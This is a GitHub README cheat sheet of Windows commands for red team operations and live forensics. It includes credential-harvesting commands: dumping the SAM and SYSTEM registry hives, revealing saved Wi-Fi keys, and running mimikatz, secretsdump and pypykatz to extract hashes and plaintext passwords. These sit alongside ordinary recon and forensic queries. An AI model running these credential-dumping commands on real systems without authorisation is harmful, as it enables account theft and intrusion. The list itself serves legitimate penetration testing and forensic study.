# 🧠 Windows Red Team & Forensics Cheatsheet

A curated list of powerful Windows commands for offensive security and digital forensics.  
This cheat sheet focuses on password extraction, persistence techniques, system info, and traces left behind.

---

## 📋 Project Overview

This repository contains practical and field-tested Windows commands useful for Red Team operations, credential harvesting, live forensics, and post-exploitation.

Each command includes a short description, where to run it (CMD/PowerShell), and its relevance.

---

## 🛠️ Credential & Password Extraction

| Command | Description | Where to Run |
|--------|-------------|--------------|
| `netsh wlan show profile name="Wi-Fi-Name" key=clear` | Shows saved Wi-Fi password | CMD |
| `rundll32.exe keymgr.dll,KRShowKeyMgr` | Shows saved credentials (GUI window) | CMD |
| `reg save HKLM\SAM sam && reg save HKLM\SYSTEM system` | Dumps SAM + SYSTEM for hash extraction | CMD (as Admin) |
| `whoami /priv` | Shows available privileges (check for SeDebugPrivilege) | CMD |
| `tasklist /V` | View running processes with window titles | CMD |
| `vaultcmd /listcreds` | List stored credentials in Windows Vault | CMD |
| `findstr /si password *.txt *.ini *.xml` | Searches for password keywords in text/config files | CMD |

---

## 🔒 Hash Extraction (External Tools)

| Command | Description | Where to Run |
|--------|-------------|--------------|
| `secretsdump.py -sam sam -system system LOCAL` | Dumps NTLM hashes from registry | Python (Impacket) |
| `mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"` | Extracts plaintext credentials and hashes | CMD (Run as SYSTEM) |
| `Pypykatz live lsa` | Python-based Mimikatz alternative | Python |

---

## 📦 Persistence & Auto-Execution

| Command | Description | Where to Run |
|--------|-------------|--------------|
| `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Lists startup entries for current user | CMD |
| `schtasks /query /fo LIST /v` | Shows scheduled tasks (could be malicious) | CMD |
| `wmic startup get caption,command` | Lists startup programs via WMI | CMD |

---

## 🧠 System Information & Host Recon

| Command | Description | Where to Run |
|--------|-------------|--------------|
| `systeminfo` | Detailed OS & patch level info | CMD |
| `hostname && whoami && echo %USERDOMAIN%` | User & domain info | CMD |
| `net users` / `net user [username]` | Lists users and account info | CMD |
| `net localgroup administrators` | See who is in the local admin group | CMD |

---

## 🔍 Network & Connections

| Command | Description | Where to Run |
|--------|-------------|--------------|
| `ipconfig /all` | IP, DNS, DHCP details | CMD |
| `netstat -ano` | Lists active connections with PID | CMD |
| `Get-NetTCPConnection` | PowerShell version of netstat | PowerShell |
| `route print` | Shows the routing table | CMD |

---

## 📁 Forensics: User Traces

| Command | Description | Where to Run |
|--------|-------------|--------------|
| `Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent"` | Lists recently opened files | PowerShell |
| `Get-Clipboard` | Show current clipboard contents | PowerShell |
| `Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"` | Shows recent run commands | PowerShell |

---

## ⚙️ Useful Tools (External)

- 🧪 [Mimikatz](https://github.com/gentilkiwi/mimikatz) – Credential harvesting
- 🐍 [Impacket](https://github.com/SecureAuthCorp/impacket) – Hash dumping & lateral movement
- 📦 [Pypykatz](https://github.com/skelsec/pypykatz) – Mimikatz written in Python
- 🧩 [Sysinternals Suite](https://learn.microsoft.com/en-us/sysinternals/) – Process Explorer, Autoruns, etc.

---

## 👨‍💻 Maintainer

Project by [TomSec8](https://github.com/TomSec8)  
Feel free to contribute additional commands or tools via pull requests.

---

## 📜 License

This project is licensed under the MIT License – see the [LICENSE](LICENSE) file for details.

---
